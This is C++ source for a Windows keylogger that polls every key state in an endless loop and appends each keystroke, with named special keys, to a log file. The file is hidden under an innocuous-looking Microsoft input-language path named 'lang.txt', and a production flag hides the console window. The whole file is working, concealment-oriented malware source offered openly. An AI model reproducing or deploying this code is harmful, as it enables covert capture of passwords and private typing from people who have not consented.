// HarshitJoshi9152 (https://github.com/HarshitJoshi9152/)

#include "CppKeyLogger.h"
#include <Windows.h>
#include <fstream>

#include <WinUser.h>

#include <iostream>
#include <chrono>
#include <ctime>

using namespace std;

#define DELIMITER " "
#define LOG_LOCATION "C:\\Users\\harsj\\AppData\\Local\\Microsoft\\input\\ar-QA\\"
#define LOG_FILENAME "lang.txt"
#define PRODUCTION false

bool IS_LOGGING_RN = false;

bool handle_special_key_press(char key, std::ostream &stream);
void log(std::ostream &);

int main()
{
	// to hide the window
	ShowWindow(GetConsoleWindow(), PRODUCTION ? SW_HIDE : SW_SHOWNORMAL);
	cout << "Logging Begins ...." << endl;

	// Getting output stream ready
	ofstream out_file;
	out_file.open(LOG_LOCATION LOG_FILENAME, ios::app);

	// what if we are unable to open a file, Try different locations from list !
	if (out_file.is_open())
	{
		log(out_file);
	}
	else
	{
		cerr << "UNABLE TO OPEN FILE" << endl;
		// log(cout);
	}

	out_file.close();
	return 0;
}

void log(std::ostream &Sink)
{
	IS_LOGGING_RN = true;

	// Starting Logging
	auto start = std::chrono::system_clock::now();
	std::time_t start_time = std::chrono::system_clock::to_time_t(start);

	Sink << endl
		 << endl
		 << endl
		 << "[LOGGING STARTS] " << std::ctime(&start_time) << endl;

	char key = 0;
	bool handled_as_special_key = false;

	while (true)
	{
		for (key = 0; key < 0xfe; key++)
		{
			if (key % 60 == 0)
				Sleep(1);
			if (GetAsyncKeyState(key) & 1)
			{

				handled_as_special_key = handle_special_key_press(key, Sink);
				if (!handled_as_special_key)
					Sink << key;
			}
		}
	}

	Sink << "[LOGGING ENDS]" << endl
		 << endl;
}

inline bool handle_special_key_press(char key, std::ostream &stream)
{
	switch (key)
	{
	case VK_LBUTTON:
		stream << DELIMITER << "[LBUTTON]" << DELIMITER;
		break;
	case VK_RBUTTON:
		stream << DELIMITER << "[RBUTTON]" << DELIMITER;
		break;
	case VK_CANCEL:
		stream << DELIMITER << "[CANCEL]" << DELIMITER;
		break;
	case VK_MBUTTON:
		stream << DELIMITER << "[MBUTTON]" << DELIMITER;
		break;
	case VK_XBUTTON1:
		stream << DELIMITER << "[XBUTTON1]" << DELIMITER;
		break;
	case VK_XBUTTON2:
		stream << DELIMITER << "[XBUTTON2]" << DELIMITER;
		break;
	case VK_BACK:
		stream << DELIMITER << "[BACK]" << DELIMITER;
		break;
	case VK_TAB:
		stream << DELIMITER << "[TAB]" << DELIMITER;
		break;
	case VK_CLEAR:
		stream << DELIMITER << "[CLEAR]" << DELIMITER;
		break;
	case VK_RETURN:
		stream << DELIMITER << "[RETURN]" << DELIMITER;
		break;
	case VK_SHIFT:
		stream << DELIMITER << "[SHIFT]" << DELIMITER;
		break;
	case VK_CONTROL:
		stream << DELIMITER << "[CONTROL]" << DELIMITER;
		break;
	case VK_MENU:
		stream << DELIMITER << "[MENU]" << DELIMITER;
		break;
	case VK_PAUSE:
		stream << DELIMITER << "[PAUSE]" << DELIMITER;
		break;
	case VK_CAPITAL:
		stream << DELIMITER << "[CAPITAL]" << DELIMITER;
		break;
	case VK_KANA:
		stream << DELIMITER << "[KANA]" << DELIMITER;
		break;
		/*case VK_HANGUEL:
			stream << DELIMITER << "[HANGUEL]" << DELIMITER;
			break;
		case VK_HANGUL:
			stream << DELIMITER << "[HANGUL]" << DELIMITER;*/
		break;
	case VK_IME_ON:
		stream << DELIMITER << "[IME_ON]" << DELIMITER;
		break;
	case VK_JUNJA:
		stream << DELIMITER << "[JUNJA]" << DELIMITER;
		break;
	case VK_FINAL:
		stream << DELIMITER << "[FINAL]" << DELIMITER;
		break;
	case VK_HANJA:
		stream << DELIMITER << "[HANJA]" << DELIMITER;
		break;
		// case VK_KANJI:
		//	stream << DELIMITER << "[KANJI]" << DELIMITER;
		break;
	case VK_IME_OFF:
		stream << DELIMITER << "[IME_OFF]" << DELIMITER;
		break;
	case VK_ESCAPE:
		stream << DELIMITER << "[ESCAPE]" << DELIMITER;
		break;
	case VK_CONVERT:
		stream << DELIMITER << "[CONVERT]" << DELIMITER;
		break;
	case VK_NONCONVERT:
		stream << DELIMITER << "[NONCONVERT]" << DELIMITER;
		break;
	case VK_ACCEPT:
		stream << DELIMITER << "[ACCEPT]" << DELIMITER;
		break;
	case VK_MODECHANGE:
		stream << DELIMITER << "[MODECHANGE]" << DELIMITER;
		break;
	case VK_SPACE:
		stream << DELIMITER << "[SPACE]" << DELIMITER;
		break;
	case VK_PRIOR:
		stream << DELIMITER << "[PRIOR]" << DELIMITER;
		break;
	case VK_NEXT:
		stream << DELIMITER << "[NEXT]" << DELIMITER;
		break;
	case VK_END:
		stream << DELIMITER << "[END]" << DELIMITER;
		break;
	case VK_HOME:
		stream << DELIMITER << "[HOME]" << DELIMITER;
		break;
	case VK_LEFT:
		stream << DELIMITER << "[LEFT]" << DELIMITER;
		break;
	case VK_UP:
		stream << DELIMITER << "[UP]" << DELIMITER;
		break;
	case VK_RIGHT:
		stream << DELIMITER << "[RIGHT]" << DELIMITER;
		break;
	case VK_DOWN:
		stream << DELIMITER << "[DOWN]" << DELIMITER;
		break;
	case VK_SELECT:
		stream << DELIMITER << "[SELECT]" << DELIMITER;
		break;
	case VK_PRINT:
		stream << DELIMITER << "[PRINT]" << DELIMITER;
		break;
	case VK_EXECUTE:
		stream << DELIMITER << "[EXECUTE]" << DELIMITER;
		break;
	case VK_SNAPSHOT:
		stream << DELIMITER << "[SNAPSHOT]" << DELIMITER;
		break;
	case VK_INSERT:
		stream << DELIMITER << "[INSERT]" << DELIMITER;
		break;
	case VK_DELETE:
		stream << DELIMITER << "[DELETE]" << DELIMITER;
		break;
	case VK_HELP:
		stream << DELIMITER << "[HELP]" << DELIMITER;
		break;
	case VK_LWIN:
		stream << DELIMITER << "[LWIN]" << DELIMITER;
		break;
	case VK_RWIN:
		stream << DELIMITER << "[RWIN]" << DELIMITER;
		break;
	case VK_APPS:
		stream << DELIMITER << "[APPS]" << DELIMITER;
		break;
	case VK_SLEEP:
		stream << DELIMITER << "[SLEEP]" << DELIMITER;
		break;
	case VK_NUMPAD0:
		stream << DELIMITER << "[NUMPAD0]" << DELIMITER;
		break;
	case VK_NUMPAD1:
		stream << DELIMITER << "[NUMPAD1]" << DELIMITER;
		break;
	case VK_NUMPAD2:
		stream << DELIMITER << "[NUMPAD2]" << DELIMITER;
		break;
	case VK_NUMPAD3:
		stream << DELIMITER << "[NUMPAD3]" << DELIMITER;
		break;
	case VK_NUMPAD4:
		stream << DELIMITER << "[NUMPAD4]" << DELIMITER;
		break;
	case VK_NUMPAD5:
		stream << DELIMITER << "[NUMPAD5]" << DELIMITER;
		break;
	case VK_NUMPAD6:
		stream << DELIMITER << "[NUMPAD6]" << DELIMITER;
		break;
	case VK_NUMPAD7:
		stream << DELIMITER << "[NUMPAD7]" << DELIMITER;
		break;
	case VK_NUMPAD8:
		stream << DELIMITER << "[NUMPAD8]" << DELIMITER;
		break;
	case VK_NUMPAD9:
		stream << DELIMITER << "[NUMPAD9]" << DELIMITER;
		break;
	case VK_MULTIPLY:
		stream << DELIMITER << "[MULTIPLY]" << DELIMITER;
		break;
	case VK_ADD:
		stream << DELIMITER << "[ADD]" << DELIMITER;
		break;
	case VK_SEPARATOR:
		stream << DELIMITER << "[SEPARATOR]" << DELIMITER;
		break;
	case VK_SUBTRACT:
		stream << DELIMITER << "[SUBTRACT]" << DELIMITER;
		break;
	case VK_DECIMAL:
		stream << DELIMITER << "[DECIMAL]" << DELIMITER;
		break;
	case VK_DIVIDE:
		stream << DELIMITER << "[DIVIDE]" << DELIMITER;
		break;
	case VK_F1:
		stream << DELIMITER << "[F1]" << DELIMITER;
		break;
	case VK_F2:
		stream << DELIMITER << "[F2]" << DELIMITER;
		break;
	case VK_F3:
		stream << DELIMITER << "[F3]" << DELIMITER;
		break;
	case VK_F4:
		stream << DELIMITER << "[F4]" << DELIMITER;
		break;
	case VK_F5:
		stream << DELIMITER << "[F5]" << DELIMITER;
		break;
	case VK_F6:
		stream << DELIMITER << "[F6]" << DELIMITER;
		break;
	case VK_F7:
		stream << DELIMITER << "[F7]" << DELIMITER;
		break;
	case VK_F8:
		stream << DELIMITER << "[F8]" << DELIMITER;
		break;
	case VK_F9:
		stream << DELIMITER << "[F9]" << DELIMITER;
		break;
	case VK_F10:
		stream << DELIMITER << "[F10]" << DELIMITER;
		break;
	case VK_F11:
		stream << DELIMITER << "[F11]" << DELIMITER;
		break;
	case VK_F12:
		stream << DELIMITER << "[F12]" << DELIMITER;
		break;
	case VK_F13:
		stream << DELIMITER << "[F13]" << DELIMITER;
		break;
	case VK_F14:
		stream << DELIMITER << "[F14]" << DELIMITER;
		break;
	case VK_F15:
		stream << DELIMITER << "[F15]" << DELIMITER;
		break;
	case VK_F16:
		stream << DELIMITER << "[F16]" << DELIMITER;
		break;
	case VK_F17:
		stream << DELIMITER << "[F17]" << DELIMITER;
		break;
	case VK_F18:
		stream << DELIMITER << "[F18]" << DELIMITER;
		break;
	case VK_F19:
		stream << DELIMITER << "[F19]" << DELIMITER;
		break;
	case VK_F20:
		stream << DELIMITER << "[F20]" << DELIMITER;
		break;
	case VK_F21:
		stream << DELIMITER << "[F21]" << DELIMITER;
		break;
	case VK_F22:
		stream << DELIMITER << "[F22]" << DELIMITER;
		break;
	case VK_F23:
		stream << DELIMITER << "[F23]" << DELIMITER;
		break;
	case VK_F24:
		stream << DELIMITER << "[F24]" << DELIMITER;
		break;
	case VK_NUMLOCK:
		stream << DELIMITER << "[NUMLOCK]" << DELIMITER;
		break;
	case VK_SCROLL:
		stream << DELIMITER << "[SCROLL]" << DELIMITER;
		break;
	case VK_LSHIFT:
		stream << DELIMITER << "[LSHIFT]" << DELIMITER;
		break;
	case VK_RSHIFT:
		stream << DELIMITER << "[RSHIFT]" << DELIMITER;
		break;
	case VK_LCONTROL:
		stream << DELIMITER << "[LCONTROL]" << DELIMITER;
		break;
	case VK_RCONTROL:
		stream << DELIMITER << "[RCONTROL]" << DELIMITER;
		break;
	case VK_LMENU:
		stream << DELIMITER << "[LMENU]" << DELIMITER;
		break;
	case VK_RMENU:
		stream << DELIMITER << "[RMENU]" << DELIMITER;
		break;
	case VK_BROWSER_BACK:
		stream << DELIMITER << "[BROWSER_BACK]" << DELIMITER;
		break;
	case VK_BROWSER_FORWARD:
		stream << DELIMITER << "[BROWSER_FORWARD]" << DELIMITER;
		break;
	case VK_BROWSER_REFRESH:
		stream << DELIMITER << "[BROWSER_REFRESH]" << DELIMITER;
		break;
	case VK_BROWSER_STOP:
		stream << DELIMITER << "[BROWSER_STOP]" << DELIMITER;
		break;
	case VK_BROWSER_SEARCH:
		stream << DELIMITER << "[BROWSER_SEARCH]" << DELIMITER;
		break;
	case VK_BROWSER_FAVORITES:
		stream << DELIMITER << "[BROWSER_FAVORITES]" << DELIMITER;
		break;
	case VK_BROWSER_HOME:
		stream << DELIMITER << "[BROWSER_HOME]" << DELIMITER;
		break;
	case VK_VOLUME_MUTE:
		stream << DELIMITER << "[VOLUME_MUTE]" << DELIMITER;
		break;
	case VK_VOLUME_DOWN:
		stream << DELIMITER << "[VOLUME_DOWN]" << DELIMITER;
		break;
	case VK_VOLUME_UP:
		stream << DELIMITER << "[VOLUME_UP]" << DELIMITER;
		break;
	case VK_MEDIA_NEXT_TRACK:
		stream << DELIMITER << "[MEDIA_NEXT_TRACK]" << DELIMITER;
		break;
	case VK_MEDIA_PREV_TRACK:
		stream << DELIMITER << "[MEDIA_PREV_TRACK]" << DELIMITER;
		break;
	case VK_MEDIA_STOP:
		stream << DELIMITER << "[MEDIA_STOP]" << DELIMITER;
		break;
	case VK_MEDIA_PLAY_PAUSE:
		stream << DELIMITER << "[MEDIA_PLAY_PAUSE]" << DELIMITER;
		break;
	case VK_LAUNCH_MAIL:
		stream << DELIMITER << "[LAUNCH_MAIL]" << DELIMITER;
		break;
	case VK_LAUNCH_MEDIA_SELECT:
		stream << DELIMITER << "[LAUNCH_MEDIA_SELECT]" << DELIMITER;
		break;
	case VK_LAUNCH_APP1:
		stream << DELIMITER << "[LAUNCH_APP1]" << DELIMITER;
		break;
	case VK_LAUNCH_APP2:
		stream << DELIMITER << "[LAUNCH_APP2]" << DELIMITER;
		break;
	case VK_OEM_1:
		stream << DELIMITER << "[OEM_1]" << DELIMITER;
		break;
	case VK_OEM_PLUS:
		stream << DELIMITER << "[OEM_PLUS]" << DELIMITER;
		break;
	case VK_OEM_COMMA:
		stream << DELIMITER << "[OEM_COMMA]" << DELIMITER;
		break;
	case VK_OEM_MINUS:
		stream << DELIMITER << "[OEM_MINUS]" << DELIMITER;
		break;
	case VK_OEM_PERIOD:
		stream << DELIMITER << "[OEM_PERIOD]" << DELIMITER;
		break;
	case VK_OEM_2:
		stream << DELIMITER << "[OEM_2]" << DELIMITER;
		break;
	case VK_OEM_3:
		stream << DELIMITER << "[OEM_3]" << DELIMITER;
		break;
	case VK_OEM_4:
		stream << DELIMITER << "[OEM_4]" << DELIMITER;
		break;
	case VK_OEM_5:
		stream << DELIMITER << "[OEM_5]" << DELIMITER;
		break;
	case VK_OEM_6:
		stream << DELIMITER << "[OEM_6]" << DELIMITER;
		break;
	case VK_OEM_7:
		stream << DELIMITER << "[OEM_7]" << DELIMITER;
		break;
	case VK_OEM_8:
		stream << DELIMITER << "[OEM_8]" << DELIMITER;
		break;
	case VK_OEM_102:
		stream << DELIMITER << "[OEM_102]" << DELIMITER;
		break;
	case VK_PROCESSKEY:
		stream << DELIMITER << "[PROCESSKEY]" << DELIMITER;
		break;
	case VK_PACKET:
		stream << DELIMITER << "[PACKET]" << DELIMITER;
		break;
	case VK_ATTN:
		stream << DELIMITER << "[ATTN]" << DELIMITER;
		break;
	case VK_CRSEL:
		stream << DELIMITER << "[CRSEL]" << DELIMITER;
		break;
	case VK_EXSEL:
		stream << DELIMITER << "[EXSEL]" << DELIMITER;
		break;
	case VK_EREOF:
		stream << DELIMITER << "[EREOF]" << DELIMITER;
		break;
	case VK_PLAY:
		stream << DELIMITER << "[PLAY]" << DELIMITER;
		break;
	case VK_ZOOM:
		stream << DELIMITER << "[ZOOM]" << DELIMITER;
		break;
	case VK_NONAME:
		stream << DELIMITER << "[NONAME]" << DELIMITER;
		break;
	case VK_PA1:
		stream << DELIMITER << "[PA1]" << DELIMITER;
		break;
	case VK_OEM_CLEAR:
		stream << DELIMITER << "[OEM_CLEAR]" << DELIMITER;
		break;
	default:
		return false;
	}
	return true;
}
